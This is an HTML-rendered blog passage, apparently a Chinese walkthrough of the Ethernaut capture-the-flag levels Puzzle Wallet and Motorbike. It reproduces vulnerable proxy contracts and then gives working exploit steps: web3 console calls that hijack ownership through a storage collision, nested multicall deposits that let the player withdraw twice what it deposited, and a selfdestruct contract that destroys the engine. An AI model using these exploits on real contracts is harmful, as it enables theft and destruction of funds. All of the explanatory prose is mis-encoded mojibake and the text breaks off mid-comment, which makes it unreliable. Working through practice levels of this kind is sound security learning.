class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br>pragma experimental ABIEncoderV2;<br><br>import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;<br>import &quot;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&quot;;<br><br>contract PuzzleProxy is UpgradeableProxy &#123;<br>    address public pendingAdmin;<br>    address public admin;<br><br>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;<br>        admin = _admin;<br>    &#125;<br><br>    modifier onlyAdmin &#123;<br>      require(msg.sender == admin, &quot;Caller is not the admin&quot;);<br>      _;<br>    &#125;<br><br>    function proposeNewAdmin(address _newAdmin) external &#123;<br>        pendingAdmin = _newAdmin;<br>    &#125;<br><br>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;<br>        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);<br>        admin = pendingAdmin;<br>    &#125;<br><br>    function upgradeTo(address _newImplementation) external onlyAdmin &#123;<br>        _upgradeTo(_newImplementation);<br>    &#125;<br>&#125;<br><br>contract PuzzleWallet &#123;<br>    using SafeMath for uint256;<br>    address public owner;<br>    uint256 public maxBalance;<br>    mapping(address =&gt; bool) public whitelisted;<br>    mapping(address =&gt; uint256) public balances;<br><br>    function init(uint256 _maxBalance) public &#123;<br>        require(maxBalance == 0, &quot;Already initialized&quot;);<br>        maxBalance = _maxBalance;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyWhitelisted &#123;<br>        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);<br>        _;<br>    &#125;<br><br>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;<br>      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);<br>      maxBalance = _maxBalance;<br>    &#125;<br><br>    function addToWhitelist(address addr) external &#123;<br>        require(msg.sender == owner, &quot;Not the owner&quot;);<br>        whitelisted[addr] = true;<br>    &#125;<br><br>    function deposit() external payable onlyWhitelisted &#123;<br>      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);<br>      balances[msg.sender] = balances[msg.sender].add(msg.value);<br>    &#125;<br><br>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;<br>        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);<br>        balances[msg.sender] = balances[msg.sender].sub(value);<br>        (bool success, ) = to.call&#123; value: value &#125;(data);<br>        require(success, &quot;Execution failed&quot;);<br>    &#125;<br><br>    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;<br>        bool depositCalled = false;<br>        for (uint256 i = 0; i &lt; data.length; i++) &#123;<br>            bytes memory _data = data[i];<br>            bytes4 selector;<br>            assembly &#123;<br>                selector := mload(add(_data, 32))<br>            &#125;<br>            if (selector == this.deposit.selector) &#123;<br>                require(!depositCalled, &quot;Deposit can only be called once&quot;);<br>                // Protect against reusing msg.value<br>                depositCalled = true;<br>            &#125;<br>            (bool success, ) = address(this).delegatecall(data[i]);<br>            require(success, &quot;Error while delegating call&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-11"><a href="#åˆçº¦åˆ†æ-11" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>å…ˆçœ‹ä¸€ä¸‹å­åˆçº¦UpgradeableProxy</p><ul><li><a href="https://blog.openzeppelin.com/proxy-patterns/">Proxy Patterns</a></li></ul><p>è¿™é‡Œçš„æ¼æ´æ˜¯ç”±äºä»£ç†åˆçº¦ ( ) å’Œé€»è¾‘åˆçº¦ ( ) ä¹‹é—´çš„<strong>å­˜å‚¨å†²çª</strong>è€Œå‡ºç°çš„ã€‚</p><p>åœ¨ä»£ç†æ¨¡å¼ä¸­ï¼Œå‘é€çš„ä»»ä½•è°ƒç”¨/äº‹åŠ¡éƒ½ä¸ä¼šç›´æ¥è½¬åˆ°é€»è¾‘åˆçº¦ï¼ˆ<code>PuzzleWallet</code>æ­¤å¤„ï¼‰ï¼Œä½†å®é™…ä¸Šæ˜¯é€šè¿‡æ–¹æ³•<strong>å§”æ‰˜</strong>ç»™ä»£ç†åˆçº¦ï¼ˆ<code>PuzzleProxy</code>æ­¤å¤„ï¼‰å†…éƒ¨çš„é€»è¾‘åˆçº¦<code>delegatecall</code>ã€‚</p><p>ç”±äº<code>delegatecall</code>æ˜¯ä¸Šä¸‹æ–‡ä¿ç•™ï¼Œå› æ­¤ä¸Šä¸‹æ–‡å–è‡ª<code>PuzzleProxy</code>ã€‚è¿™æ„å‘³ç€ï¼Œå­˜å‚¨ä¸­çš„ä»»ä½•çŠ¶æ€è¯»å–æˆ–å†™å…¥éƒ½å°†å‘ç”Ÿåœ¨<code>PuzzleProxy</code>ç›¸åº”çš„æ’æ§½ä¸­ï¼Œè€Œä¸æ˜¯<code>PuzzleWallet</code>.</p><p>æœ‰</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">slot | PuzzleWallet  -  PuzzleProxy</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-code"> 0   |   owner      &lt;-  pendingAdmin</span><br><span class="hljs-code"> 1   |   maxBalance &lt;-  admin</span><br><span class="hljs-code"> 2   |           . </span><br><span class="hljs-code"> 3   |           .</span><br></code></pre></td></tr></table></figure><ol><li><p>è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è®¾ç½® <code>pendingAdmin</code> ä¸º <code>player</code> ï¼ˆé€šè¿‡  <code>PuzzleProxy</code> ä¸­çš„ <code>proposeNewAdmin</code> æ–¹æ³•ï¼‰ï¼Œ <code>player</code> åˆ™è‡ªåŠ¨æˆä¸º <code>owner</code> ï¼</p><p>ç”±äº<code>proposeNewAdmin</code> æ–¹æ³•è®¾ç½®ä¸º <code>external</code> ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥å¯¹å‡½æ•°è°ƒç”¨çš„ç­¾åè¿›è¡Œç¼–ç å¹¶å°†äº¤æ˜“å‘é€åˆ°åˆçº¦</p></li><li><p><code>admin</code> ä¹Ÿå’Œ <code>maxBalance</code>å¯¹åº”äºç›¸åŒçš„æ’æ§½ï¼ˆæ’æ§½ 1ï¼‰ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥<code>admin</code>ä»¥æŸç§æ–¹å¼å†™å…¥<code>maxBalance</code>çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥<code>player</code>ã€‚</p><p><code>setMaxBalance</code> åªæœ‰å½“åˆçº¦çš„ä½™é¢ä¸º0æ—¶æ‰èƒ½è®¾ç½®æ–° <code>maxBalance</code> çš„</p><p>æ£€æŸ¥ä½™é¢ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> getBalance(contract.address)<br><span class="hljs-comment">//0.001</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>execute</code> å–å‡ºåˆçº¦ä¸­çš„ä½™é¢ï¼Œä½†åˆçº¦ä¼šè·Ÿè¸ªæ¯ä¸ªç”¨æˆ·çš„ä½™é¢<code>balances</code>ï¼Œæ‚¨åªèƒ½æå–æ‚¨å­˜å…¥çš„èµ„é‡‘ã€‚æˆ‘ä»¬éœ€è¦ä¸€äº›æ–¹æ³•æ¥ç ´è§£åˆçº¦çš„è®°è´¦æœºåˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æå–æ¯”å­˜å…¥æ›´å¤šçš„é’±ï¼Œä»è€Œè€—å°½åˆçº¦çš„ä½™é¢ã€‚</p><p>å¯ä»¥å¤šæ¬¡è°ƒç”¨ç›¸åŒ<code>deposit</code>çš„æ–¹æ³•ï¼Œå¹¶ä¸”åˆçº¦ä¸­çš„ <code>multicall</code> æ–¹æ³•å¯ä»¥å°†å¤šç¬”äº¤æ˜“æ‰¹å¤„ç†ä¸ºä¸€ç¬”äº¤æ˜“ã€‚ ä½†æ˜¯ <code>multicall</code> ä¼šä»æ•°æ®ä¸­æå–å‡½æ•°é€‰æ‹©å™¨ï¼ˆç­¾åçš„å‰ 4 ä¸ªå­—èŠ‚ï¼‰ï¼Œå¹¶ç¡®ä¿ <code>deposit</code> æ¯ä¸ªäº‹åŠ¡åªè°ƒç”¨ä¸€æ¬¡</p><p>æ‰€ä»¥é€‰æ‹©è°ƒç”¨ä¸€ä¸ª <code>multicall</code> ï¼Œå…¶ä¸­è°ƒç”¨å¤šä¸ª<code>multicall</code> å¹¶ä¸”è¿™äº› <code>multicall</code> ä¸­çš„æ¯ä¸€ä¸ªéƒ½è°ƒç”¨ <code>deposit</code> ä¸€æ¬¡</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">       multicall<br>          |<span class="hljs-string"></span><br><span class="hljs-string">   -----------------</span><br><span class="hljs-string">   </span>|<span class="hljs-string">               </span>|<br>multicall        multicall<br>   |<span class="hljs-string">                 </span>|<br> deposit          deposit     <br></code></pre></td></tr></table></figure></li></ol><h3 id="æ”»å‡»æµç¨‹-11"><a href="#æ”»å‡»æµç¨‹-11" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li>å°† <code>player</code> è®¾ç½®ä¸º <code>owner</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">functionSignature = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;proposeNewAdmin&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;function&#x27;</span>,<br>    <span class="hljs-attr">inputs</span>: [<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;_newAdmin&#x27;</span><br>        &#125;<br>    ]<br>&#125;<br><br>params = [player]<br><br>data = web3.eth.abi.encodeFunctionCall(functionSignature, params)<br><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: instance, data&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li>éªŒè¯ownerå¹¶æŸ¥è¯¢ä½™é¢</li></ol><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223402638.png" alt="image-20220312223402638"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223510320.png" alt="image-20220312223510320"></p><ol start="3"><li>å°†<code>owner</code>æˆ‘ä»¬åˆ—å…¥ç™½åå•</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.addToWhitelist(player)<br></code></pre></td></tr></table></figure><ol start="4"><li>è·å–å‡½æ•°è°ƒç”¨ç¼–ç </li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">depositData = <span class="hljs-keyword">await</span> contract.methods[<span class="hljs-string">&quot;deposit()&quot;</span>].request().then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.data)<br><span class="hljs-comment">//&#x27;0xd0e30db0&#x27;</span><br><br>multicallData = <span class="hljs-keyword">await</span> contract.methods[<span class="hljs-string">&quot;multicall(bytes[])&quot;</span>].request([depositData]).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.data)<br><span class="hljs-comment">//&#x27;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&#x27;</span><br></code></pre></td></tr></table></figure><ol start="5"><li>è°ƒç”¨<code>multicall</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.multicall([multicallData, multicallData], &#123;<span class="hljs-attr">value</span>: toWei(<span class="hljs-string">&#x27;0.001&#x27;</span>)&#125;)<br></code></pre></td></tr></table></figure><ol start="6"><li>æå–ç›¸åŒçš„é‡‘é¢</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.execute(player, toWei(<span class="hljs-string">&#x27;0.002&#x27;</span>), <span class="hljs-number">0x0</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li>æ£€æŸ¥ä½™é¢</li></ol><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223721874.png" alt="image-20220312223721874"></p><ol start="8"><li>å°† admin è®¾ç½®ä¸º<code>player</code>ï¼š</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.setMaxBalance(player)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220312223829682.png" alt="image-20220312223829682"></p><h2 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h2><h3 id="é—¯å…³è¦æ±‚-12"><a href="#é—¯å…³è¦æ±‚-12" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>Ethernaut çš„æ‘©æ‰˜è½¦æ‹¥æœ‰å…¨æ–°çš„å¯å‡çº§å¼•æ“è®¾è®¡ã€‚</p><p>ä½ èƒ½è‡ªæ¯å®ƒçš„å¼•æ“å¹¶ä½¿æ‘©æ‰˜è½¦æ— æ³•ä½¿ç”¨å—ï¼Ÿ</p><h3 id="åˆçº¦ä»£ç -12"><a href="#åˆçº¦ä»£ç -12" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;<br>import &quot;@openzeppelin/contracts/proxy/Initializable.sol&quot;;<br><br>contract Motorbike &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br>    <br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br>    <br>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.<br>    constructor(address _logic) public &#123;<br>        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);<br>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;<br>        (bool success,) = _logic.delegatecall(<br>            abi.encodeWithSignature(&quot;initialize()&quot;)<br>        );<br>        require(success, &quot;Call failed&quot;);<br>    &#125;<br><br>    // Delegates the current call to `implementation`.<br>    function _delegate(address implementation) internal virtual &#123;<br>        // solhint-disable-next-line no-inline-assembly<br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize())<br>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)<br>            returndatacopy(0, 0, returndatasize())<br>            switch result<br>            case 0 &#123; revert(0, returndatasize()) &#125;<br>            default &#123; return(0, returndatasize()) &#125;<br>        &#125;<br>    &#125;<br><br>    // Fallback function that delegates calls to the address returned by `_implementation()`. <br>    // Will run if no other function in the contract matches the call data<br>    fallback () external payable virtual &#123;<br>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);<br>    &#125;<br>    <br>    // Returns an `AddressSlot` with member `value` located at `slot`.<br>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;<br>        assembly &#123;<br>            r_slot := slot<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Engine is Initializable &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    address public upgrader;<br>    uint256 public horsePower;<br><br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br><br>    function initialize() external initializer &#123;<br>        horsePower = 1000;<br>        upgrader = msg.sender;<br>    &#125;<br><br>    // Upgrade the implementation of the proxy to `newImplementation`<br>    // subsequently execute the function call<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;<br>        _authorizeUpgrade();<br>        _upgradeToAndCall(newImplementation, data);<br>    &#125;<br><br>    // Restrict to upgrader role<br>    function _authorizeUpgrade() internal view &#123;<br>        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);<br>    &#125;<br><br>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data<br>    ) internal &#123;<br>        // Initial upgrade and setup call<br>        _setImplementation(newImplementation);<br>        if (data.length &gt; 0) &#123;<br>            (bool success,) = newImplementation.delegatecall(data);<br>            require(success, &quot;Call failed&quot;);<br>        &#125;<br>    &#125;<br>    <br>    // Stores a new address in the EIP1967 implementation slot.<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        <br>        AddressSlot storage r;<br>        assembly &#123;<br>            r_slot := _IMPLEMENTATION_SLOT<br>        &#125;<br>        r.value = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-12"><a href="#åˆçº¦åˆ†æ-12" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/Initializable.sol">Initializable.sol</a></p><p>å½“å‰çš„ <code>Engine</code> åœ¨ä»»ä½•åœ°æ–¹éƒ½æ²¡æœ‰è‡ªæ¯é€»è¾‘ã€‚ä½†æ˜¯ï¼Œç”±äºå®ƒæ˜¯ä»£ç†æ¨¡å¼çš„é€»è¾‘/å®ç°åˆçº¦ï¼Œå®ƒå¯ä»¥å‡çº§ä¸ºå…·æœ‰ <code>selfdestruct</code> çš„æ–°åˆçº¦ã€‚</p><p><code>upgradeToAndCall</code> æ–¹æ³•å¯ä¾›æˆ‘ä»¬å‡çº§åˆ°æ–°çš„åˆçº¦åœ°å€ï¼Œä½†å®ƒæœ‰ä¸€ä¸ªæˆæƒæ£€æŸ¥ <code>_authorizeUpgrade</code> ï¼Œåªæœ‰å‡çº§è€…åœ°å€æ‰èƒ½è°ƒç”¨å®ƒã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ›´æ”¹ <code>upgrader</code> çš„ä¿¡æ¯</p><p>æ³¨æ„ï¼Œè¿™é‡Œå’Œ Puzzle Wallet å…³å¡ä¸€æ ·ï¼Œ <code>Engine</code> å®é™…ä¸Šå­˜å‚¨åœ¨ä»£ç†ï¼ˆ <code>Motorbike</code> ï¼‰çš„å­˜å‚¨ä¸­ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>Engine</code> çš„åœ°å€è°ƒç”¨åˆå§‹åŒ–ï¼Œä½¿<code>initialized</code>, <code>initializing</code> (æ¥è‡ª <code>Initializable</code>), <code>upgrader</code> ä¸ºé»˜è®¤å€¼å³<code>false</code>, <code>false</code>, <code>0x0</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Initializable.sol<br>bool private _initialized;<br>bool private _initializing;<br>modifier initializer() &#123;<br>        // If the contract is initializing we ignore whether _initialized is set in order to support multiple<br>        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the<br>        // contract may have been reentered.<br>        require(_initializing ? _isConstructor() : !_initialized, &quot;Initializable: contract is already initialized&quot;);<br><br>        bool isTopLevelCall = !_initializing;<br>        if (isTopLevelCall) &#123;<br>            _initializing = true;<br>            _initialized = true;<br>        &#125;<br><br>        _;<br><br>        if (isTopLevelCall) &#123;<br>            _initializing = false;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæœ‰ <code>selfdestruct</code> å‡½æ•°çš„åˆçº¦ï¼Œå¹¶é€šè¿‡ <code>upgradeToAndCall</code> æ–¹æ³•å‡çº§æ‰§è¡Œåˆçº¦</p><p>å¦‚æœæˆ‘ä»¬é€šè¿‡ <code>upgradeToAndCall</code> è®¾ç½®æ–°çš„å®ç°ï¼Œå°† <code>attackEngine</code> åœ°å€å’Œå®ƒçš„ <code>explode</code> æ–¹æ³•çš„ç¼–ç ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œç°æœ‰çš„ <code>Engine</code> å°†è‡ªè¡Œé”€æ¯ã€‚ è¿™æ˜¯å› ä¸º <code>_upgradeToAndCall</code> ä½¿ç”¨æä¾›çš„æ•°æ®å‚æ•°å°†è°ƒç”¨å§”æ‰˜ç»™ç»™å®šçš„æ–°å®ç°åœ°å€ã€‚ å¹¶ä¸”ç”±äº <code>delegatecall</code> æ˜¯ä¸Šä¸‹æ–‡ä¿ç•™çš„ï¼Œ<code>explode</code> æ–¹æ³•çš„ <code>selfdestruct</code> å°†åœ¨ <code>Engine</code> çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚ å› æ­¤å¼•æ“è¢«æ‘§æ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &lt;0.7.0;<br><br>contract attackEngine &#123;<br>    function explode() public &#123;<br>        selfdestruct(address(0));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ”»å‡»æµç¨‹-12"><a href="#æ”»å‡»æµç¨‹-12" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//è¯»å– Engine åœ°å€</span><br>implAddr = <span class="hljs-keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="hljs-string">&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;</span>)<br><span class="hljs-comment">//&#x27;0x000000000000000000000000a81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;</span><br><br>implAddr = <span class="hljs-string">&#x27;0x&#x27;</span> + implAddr.slice(-<span class="hljs-number">40</span>)<br><span class="hljs-comment">//&#x27;0xa81263b7b5c02eb2e8740dd9d224daab59fa5035&#x27;</span><br><br><span class="hljs-comment">//åœ¨ Engine 